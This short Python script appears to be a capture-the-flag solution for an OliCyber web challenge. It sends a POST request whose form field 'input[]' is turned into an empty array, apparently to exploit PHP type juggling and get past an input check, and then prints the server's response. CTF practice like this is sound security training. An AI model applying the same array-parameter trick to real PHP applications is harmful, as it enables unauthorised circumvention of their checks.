import requests

url = "http://soundofsilence.challs.olicyber.it/"
data = {
    "input[]": ""
}
response = requests.post(url, data=data)
print(response.text)